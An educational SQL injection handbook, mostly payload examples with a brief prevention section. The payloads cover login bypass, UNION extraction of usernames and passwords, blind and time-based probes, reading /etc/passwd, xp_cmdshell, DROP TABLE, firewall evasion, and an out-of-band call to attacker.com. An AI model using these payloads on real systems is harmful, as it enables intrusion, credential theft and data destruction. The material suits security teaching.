## SQL Injection Handbook

### Table of Contents

1. [Introduction to SQL Injection](#introduction-to-sql-injection)
2. [Types of SQL Injection Attacks](#types-of-sql-injection-attacks)
   - In-Band SQL Injection
     - Error-Based SQL Injection
     - Union-Based SQL Injection
   - Blind SQL Injection
     - Boolean-Based Blind SQL Injection
     - Time-Based Blind SQL Injection
   - Out-of-Band SQL Injection
   - Second-Order SQL Injection
   - Stored Procedure Injection
   - Database-Specific SQL Injection
3. [Techniques and Exploitation](#techniques-and-exploitation)
   - Identifying Vulnerabilities
   - Common Error Messages and Their Meanings
   - Crafting Malicious Payloads
   - Using SQLMap and Other Tools
4. [Real-World Scenarios and Examples](#real-world-scenarios-and-examples)
   - Exploiting Login Forms
   - Bypassing Authentication
   - Extracting Sensitive Data
   - SQL Injection in Search Fields
   - Exploiting URL Parameters
5. [Error-Based SQL Injection in Depth](#error-based-sql-injection-in-depth)
   - Common SQL Errors
   - Extracting Data by Exploiting Errors
6. [Union-Based SQL Injection in Depth](#union-based-sql-injection-in-depth)
   - How It Works
   - Finding the Number of Columns
   - Extracting Data with UNION SELECT
   - Avoiding Detection
7. [Blind SQL Injection Techniques in Depth](#blind-sql-injection-techniques-in-depth)
   - Boolean-Based Blind SQL Injection
   - Time-Based Blind SQL Injection
   - Advanced Techniques
8. [Advanced SQL Injection Techniques](#advanced-sql-injection-techniques)
   - Second-Order SQL Injection
   - SQL Injection in Different Contexts (JSON, XML, Web Services, etc.)
   - Bypassing Web Application Firewalls (WAFs)
9. [Tools for SQL Injection](#tools-for-sql-injection)
   - SQLMap
   - Havij
   - SQLNinja
   - jSQL Injection
   - Other Notable Tools
10. [Detection and Prevention Techniques](#detection-and-prevention-techniques)
    - Manual Code Review
    - Automated Scanning and Tools
    - Input Validation and Parameterized Queries
    - Web Application Firewalls (WAF)
11. [Best Practices and Tips](#best-practices-and-tips)
    - Secure Coding Practices
    - Regular Security Audits
    - Educating Developers and Security Teams
12. [Resources and Further Reading](#resources-and-further-reading)
13. [Conclusion](#conclusion)

---

## Introduction to SQL Injection

**SQL Injection (SQLi)** is a code injection technique that exploits a vulnerability in an application's software by manipulating the SQL queries that are executed against a database. SQL Injection attacks can bypass authentication, access sensitive data, modify the contents of a database, execute administrative operations, and, in severe cases, gain control of the database server.

SQL Injection is a type of **injection attack** and is listed as one of the top vulnerabilities in the [OWASP Top Ten](https://owasp.org/www-project-top-ten/).

## Types of SQL Injection Attacks

### 1. **In-Band SQL Injection**

In-Band SQL Injection is the most common and straightforward type of SQL Injection. The attacker uses the same channel to inject malicious SQL code and receive the output. It is easy to exploit and has a higher risk factor.

#### a. **Error-Based SQL Injection**

Error-Based SQL Injection exploits database error messages to gather information about the database structure. By manipulating input fields or URL parameters, an attacker can trigger errors that provide clues about the database version, table names, column names, and more.

**Example**:
```sql
' OR 1=1; --
```

If the application returns an error such as "Syntax error in SQL statement," it indicates the potential for SQL Injection.

**Common SQL Errors for Exploitation**:
- Syntax errors
- Type mismatch errors
- Conversion errors
- Divide by zero errors

**Advanced Example**:
```sql
' UNION SELECT null, concat(username,':',password) FROM users; --
```
This payload could result in output such as:
```
admin:admin123
guest:guest123
```

#### b. **Union-Based SQL Injection**

Union-Based SQL Injection leverages the `UNION SELECT` statement to retrieve data from different tables. By finding a compatible number of columns and data types, an attacker can combine legitimate results with malicious results.

**Steps to Exploit**:
1. **Find the Number of Columns**:
   ```sql
   ' ORDER BY 1 -- 
   ' ORDER BY 2 -- 
   ' ORDER BY n -- 
   ```
2. **Union Injection to Extract Data**:
   ```sql
   ' UNION SELECT null, username, password FROM users; --
   ```
   
3. **Avoiding Detection**: Use comment markers like `/*`, `#`, or `--` to bypass filters and prevent query errors from revealing malicious intentions.

### 2. **Blind SQL Injection**

Blind SQL Injection is used when an application is vulnerable to SQL Injection but does not return database error messages. Attackers rely on observing changes in the application's behavior or response times to infer the results of their queries.

#### a. **Boolean-Based Blind SQL Injection**

This technique relies on crafting SQL queries that result in `TRUE` or `FALSE` responses. The application’s behavior changes based on whether the query returns true or false.

**Examples**:
```sql
' AND 1=1; --   /* The page loads normally */
' AND 1=2; --   /* The page behaves differently */
```

To determine the length of a table name:
```sql
' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=5; --
```

#### b. **Time-Based Blind SQL Injection**

Time-Based Blind SQL Injection relies on making the database server pause execution using functions like `SLEEP()`, `WAITFOR DELAY`, etc. This allows attackers to infer the result of a query based on how long it takes for the server to respond.

**Examples**:
```sql
' OR IF(1=1, SLEEP(5), 0); --
' OR IF((SELECT COUNT(*) FROM users) > 1, SLEEP(5), 0); --
```

### 3. **Out-of-Band SQL Injection**

Out-of-Band SQL Injection is less common and occurs when an attacker cannot use the same channel for injecting and retrieving data. It relies on the database's ability to make external HTTP or DNS requests.

**Example**:
```sql
' UNION SELECT load_file('\\\\attacker.com\\file'); --
```

### 4. **Second-Order SQL Injection**

Second-Order SQL Injection occurs when user input is stored in the database and later used to construct SQL queries without proper sanitization. This is more challenging to detect since the payload does not have an immediate effect.

**Example**:
A user registers with a username that includes a SQL payload:
```sql
admin'); DROP TABLE users; --
```
Later, an admin panel retrieves this username and constructs a vulnerable SQL query, executing the malicious code.

### 5. **Stored Procedure Injection**

Stored Procedure Injection involves exploiting vulnerabilities in stored procedures or functions defined in the database itself. These are often trusted, and if they do not handle inputs properly, they can be exploited.

**Example in MySQL**:
```sql
' OR 1=1; CALL some_procedure(); --
```

### 6. **Database-Specific SQL Injection**

Different databases (MySQL, MSSQL, Oracle, PostgreSQL, etc.) have unique SQL syntax and functions, creating opportunities for database-specific SQL Injection.

**MySQL Example**:
```sql
' UNION SELECT LOAD_FILE('/etc/passwd'); --
```

**MSSQL Example**:
```sql
'; EXEC xp_cmdshell('dir'); --
```

## Techniques and Exploitation

### Identifying Vulnerabilities

1. **Error Messages**: Look for detailed error messages that can reveal information about the backend database.
2. **Common Input Fields to Test**:
   - Login forms
   - Search boxes
   - URL parameters
   - HTTP headers
3. **Common SQL Injection Payloads**:
   - `admin' --`
   - `' OR '1'='1`
   - `' UNION SELECT null, username, password FROM users; --`

### Common Error Messages and Their Meanings

Understanding error messages can help identify the database type and the nature of the vulnerability:

- **MySQL Errors**:
  - `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version...`
- **MSSQL Errors**:
  - `Unclosed quotation mark after the character string...`
- **Oracle Errors**:
  - `ORA-01756: quoted string not properly terminated`

### Crafting Malicious Payloads

1. **Basic Authentication Bypass**:
   ```sql
   ' OR '1'='1
   ```
   Allows an attacker to bypass login screens without knowing valid credentials.

2. **Advanced Data Extraction**:
   ```sql
   ' UNION SELECT null, group_concat(username, ':', password) FROM users; --
   ```

### Using SQLMap and Other Tools

- **SQLMap**: A powerful automated tool that supports various databases and techniques.
  ```bash
  sqlmap -u "http://example.com/page?id=1" --dbs
  ```
- **Havij**: A GUI-based tool for automated SQL Injection.
- **SQLNinja**: Focuses on SQL Injection on Microsoft SQL Server.
- **jSQL Injection**: A Java-based tool supporting multiple injection techniques.

## Real-World Scenarios and Examples

### Exploiting Login Forms

A simple login form may be exploited using `' OR '1'='1` to bypass authentication:

- **Original Query**:
  ```sql
  SELECT * FROM users WHERE username='$user' AND password='$pass';
  ```
- **Injected Query**:
  ```sql
  SELECT * FROM users WHERE username='' OR '1'='1' AND password='';
  ```

### Bypassing Authentication

Use UNION SELECT or other SQL Injection methods to gain access without valid credentials.

### Extracting Sensitive Data

Extracting data by exploiting vulnerable search fields or input parameters:
```sql
' UNION SELECT 1, table_name FROM information_schema.tables; --
```

### SQL Injection in Search Fields

Search fields are often vulnerable due to lack of sanitization:
```sql
' OR 'x'='x
```

### Exploiting URL Parameters

When URLs use parameters that are directly inserted into SQL queries:
```sql
http://example.com/page?id=1' OR '1'='1
```

## Error-Based SQL Injection in Depth

### Common SQL Errors

- `Syntax Error`
- `Type Mismatch`
- `Conversion Error`
- `Divide by Zero`

### Extracting Data by Exploiting Errors

Manipulating queries to cause errors that reveal data:
```sql
' AND 1=CONVERT(int, (SELECT @@version)); --
```

## Union-Based SQL Injection in Depth

### How It Works

Combines the results of two or more SELECT statements. Requires matching the number and types of columns.

### Finding the Number of Columns

Use `ORDER BY` or `UNION SELECT NULL` techniques.

### Extracting Data with UNION SELECT

Basic payload:
```sql
' UNION SELECT null, username, password FROM users; --
```

### Avoiding Detection

Use comment markers and encoding to bypass WAFs:
```sql
' UNION SELECT null, username, password FROM users;--/*example*/ 
```

## Blind SQL Injection Techniques in Depth

### Boolean-Based Blind SQL Injection

Examples:
```sql
' AND (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'; --
```

### Time-Based Blind SQL Injection

Examples:
```sql
' OR IF(1=1, SLEEP(5), 0); --
```

## Advanced SQL Injection Techniques

### Second-Order SQL Injection

Stored payloads that execute later:
```sql
admin'); DROP TABLE users; --
```

### SQL Injection in Different Contexts

- **JSON-Based**: `{"username":"admin' OR '1'='1", "password":"123"}`
- **XML-Based**: `<user><name>admin' OR '1'='1</name></user>`
- **Web Services**: Exploit SQL Injection in SOAP or REST API requests.

### Bypassing Web Application Firewalls (WAFs)

1. **Obfuscation**: Changing payloads to evade pattern matching.
2. **Encoding**: Using URL encoding, hexadecimal, or Unicode:
   ```sql
   '%55%4E%49%4F%4E%20SELECT'
   ```

## Tools for SQL Injection

### SQLMap

An open-source tool that automates SQL Injection attacks:
```bash
sqlmap -u "http://example.com/page?id=1" --dbs --batch
```

### Havij

A GUI-based automated SQL Injection tool for easy exploitation.

### SQLNinja

Focuses on SQL Injection on Microsoft SQL Server.

### jSQL Injection

Java-based and supports multiple injection techniques.

### Other Notable Tools

- **BBQSQL**: A blind SQL Injection exploitation tool.
- **NoSQLMap**: Focuses on NoSQL databases.

## Detection and Prevention Techniques

### Manual Code Review

- Review all code that interacts with the database.
- Ensure proper use of parameterized queries and stored procedures.

### Automated Scanning and Tools

- **Burp Suite**: Automated scanning for SQL Injection vulnerabilities.
- **OWASP ZAP**: Open-source tool for scanning and finding vulnerabilities.

### Input Validation and Parameterized Queries

Always use parameterized queries or prepared statements.

**Examples**:
- **PHP (MySQLi)**:
  ```php
  $stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ?");
  $stmt->bind_param("s", $username);
  $stmt->execute();
  ```

### Web Application Firewalls (WAF)

Deploy WAFs to filter and block malicious traffic. Some well-known WAFs include:
- **ModSecurity**
- **Cloudflare**
- **AWS WAF**

## Best Practices and Tips

### Secure Coding Practices

- Sanitize inputs.
- Use least privilege for database accounts.
- Regularly patch and update database management systems.

### Regular Security Audits

- Conduct regular penetration testing and vulnerability assessments.

### Educating Developers and Security Teams

- Regular training sessions.
- Awareness about common security pitfalls.

## Resources and Further Reading

- [OWASP SQL Injection Guide](https://owasp.org/www-project-top-ten/)
- [The Web Application Hacker's Handbook](https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470)
- [SQLMap Documentation](http://sqlmap.org/)

## Conclusion

SQL Injection remains one of the most prevalent and dangerous web application vulnerabilities. Understanding its types, exploitation techniques, and defenses are crucial for both developers and security professionals. By implementing secure coding practices and regular security assessments, organizations can significantly reduce the risk of SQL Injection attacks.

